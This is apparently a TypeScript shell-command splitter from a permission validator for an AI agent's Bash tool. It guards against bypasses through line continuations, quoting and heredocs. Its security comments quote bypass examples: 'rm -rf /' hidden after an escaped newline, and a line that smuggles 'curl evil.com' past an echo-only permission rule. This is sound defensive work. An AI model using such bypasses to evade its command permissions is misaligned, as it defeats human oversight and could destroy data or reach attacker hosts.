import { randomBytes } from 'crypto'
export function splitCommandWithOperators(command: string): string[] {
  const parts: (ParseEntry | null)[] = []

  // Generate unique placeholders for this parse to prevent injection attacks
  // Security: Using random salt prevents malicious commands from containing
  // literal placeholder strings that would be replaced during parsing
  const placeholders = generatePlaceholders()

  // Extract heredocs before parsing - shell-quote parses << incorrectly
  const { processedCommand, heredocs } = extractHeredocs(command)

  // Join continuation lines: backslash followed by newline removes both characters
  // This must happen before newline tokenization to treat continuation lines as single commands
  // SECURITY: We must NOT add a space here - shell joins tokens directly without space.
  // Adding a space would allow bypass attacks like `tr\<newline>aceroute` being parsed as
  // `tr aceroute` (two tokens) while shell executes `traceroute` (one token).
  // SECURITY: We must only join when there's an ODD number of backslashes before the newline.
  // With an even number (e.g., `\\<newline>`), the backslashes pair up as escape sequences,
  // and the newline is a command separator, not a continuation. Joining would cause us to
  // miss checking subsequent commands (e.g., `echo \\<newline>rm -rf /` would be parsed as
  // one command but shell executes two).
  const commandWithContinuationsJoined = processedCommand.replace(
    /\\+\n/g,
    match => {
      const backslashCount = match.length - 1 // -1 for the newline
      if (backslashCount % 2 === 1) {
        // Odd number of backslashes: last one escapes the newline (line continuation)
        // Remove the escaping backslash and newline, keep remaining backslashes
        return '\\'.repeat(backslashCount - 1)
      } else {
        // Even number of backslashes: all pair up as escape sequences
        // The newline is a command separator, not continuation - keep it
        return match
      }
    },
  )

  // SECURITY: Also join continuations on the ORIGINAL command (pre-heredoc-
  // extraction) for use in the parse-failure fallback paths. The fallback
  // returns a single-element array that downstream permission checks process
  // as ONE subcommand. If we return the ORIGINAL (pre-join) text, the
  // validator checks `foo\<NL>bar` while bash executes `foobar` (joined).
  // Exploit: `echo "$\<NL>{}" ; curl evil.com` — pre-join, `$` and `{}` are
  // split across lines so `${}` isn't a dangerous pattern; `;` is visible but
  // the whole thing is ONE subcommand matching `Bash(echo:*)`. Post-join,
  // zsh/bash executes `echo "${}" ; curl evil.com` → curl runs.
  // We join on the ORIGINAL (not processedCommand) so the fallback doesn't
  // need to deal with heredoc placeholders.
  const commandOriginalJoined = command.replace(/\\+\n/g, match => {
    const backslashCount = match.length - 1
    if (backslashCount % 2 === 1) {
      return '\\'.repeat(backslashCount - 1)
    }
    return match
  })

  // Try to parse the command to detect malformed syntax
  const parseResult = tryParseShellCommand(
    commandWithContinuationsJoined
      .replaceAll('"', `"${placeholders.DOUBLE_QUOTE}`) // parse() strips out quotes :P
      .replaceAll("'", `'${placeholders.SINGLE_QUOTE}`) // parse() strips out quotes :P
      .replaceAll('\n', `\n${placeholders.NEW_LINE}\n`) // parse() strips out new lines :P
      .replaceAll('\\(', placeholders.ESCAPED_OPEN_PAREN) // parse() converts \( to ( :P
      .replaceAll('\\)', placeholders.ESCAPED_CLOSE_PAREN), // parse() converts \) to ) :P
    varName => `$${varName}`, // Preserve shell variables
  )

  // If parse failed due to malformed syntax (e.g., shell-quote throws
  // "Bad substitution" for ${var + expr} patterns), treat the entire command
  // as a single string. This is consistent with the catch block below and
  // prevents interruptions - the command still goes through permission checking.
  if (!parseResult.success) {
    // SECURITY: Return the CONTINUATION-JOINED original, not the raw original.
    // See commandOriginalJoined definition above for the exploit rationale.
    return [commandOriginalJoined]
  }

  const parsed = parseResult.tokens

  // If parse returned empty array (empty command)
  if (parsed.length === 0) {
    // Special case: empty or whitespace-only string should return empty array
    return []
  }

  try {
    // 1. Collapse adjacent strings and globs
    for (const part of parsed) {
      if (typeof part === 'string') {
        if (parts.length > 0 && typeof parts[parts.length - 1] === 'string') {
          if (part === placeholders.NEW_LINE) {
            // If the part is NEW_LINE, we want to terminate the previous string and start a new command
            parts.push(null)
          } else {
            parts[parts.length - 1] += ' ' + part
          }
          continue
        }
      } else if ('op' in part && part.op === 'glob') {
        // If the previous part is a string (not an operator), collapse the glob with it
        if (parts.length > 0 && typeof parts[parts.length - 1] === 'string') {
          parts[parts.length - 1] += ' ' + part.pattern
          continue
        }
      }
      parts.push(part)
    }

    // 2. Map tokens to strings
    const stringParts = parts
      .map(part => {
        if (part === null) {
          return null
        }
        if (typeof part === 'string') {
          return part
        }
        if ('comment' in part) {
          // shell-quote preserves comment text verbatim, including our
          // injected `"PLACEHOLDER` / `'PLACEHOLDER` markers from step 0.
          // Since the original quote was NOT stripped (comments are literal),
          // the un-placeholder step below would double each quote (`"` → `""`).
          // On recursive splitCommand calls this grows exponentially until
          // shell-quote's chunker regex catastrophically backtracks (ReDoS).
          // Strip the injected-quote prefix so un-placeholder yields one quote.
          const cleaned = part.comment
            .replaceAll(
              `"${placeholders.DOUBLE_QUOTE}`,
              placeholders.DOUBLE_QUOTE,
            )
            .replaceAll(
              `'${placeholders.SINGLE_QUOTE}`,
              placeholders.SINGLE_QUOTE,
            )
          return '#' + cleaned
        }
        if ('op' in part && part.op === 'glob') {
          return part.pattern
        }
        if ('op' in part) {
          return part.op
        }
        return null
      })
      .filter(_ => _ !== null)

    // 3. Map quotes and escaped parentheses back to their original form
    const quotedParts = stringParts.map(part => {
      return part
        .replaceAll(`${placeholders.SINGLE_QUOTE}`, "'")
        .replaceAll(`${placeholders.DOUBLE_QUOTE}`, '"')
        .replaceAll(`\n${placeholders.NEW_LINE}\n`, '\n')
        .replaceAll(placeholders.ESCAPED_OPEN_PAREN, '\\(')
        .replaceAll(placeholders.ESCAPED_CLOSE_PAREN, '\\)')
    })

    // Restore heredocs that were extracted before parsing
    return restoreHeredocs(quotedParts, heredocs)
  } catch (_error) {
    // If shell-quote fails to parse (e.g., malformed variable substitutions),
    // treat the entire command as a single string to avoid crashing
    // SECURITY: Return the CONTINUATION-JOINED original (same rationale as above).
    return [commandOriginalJoined]
  }
}

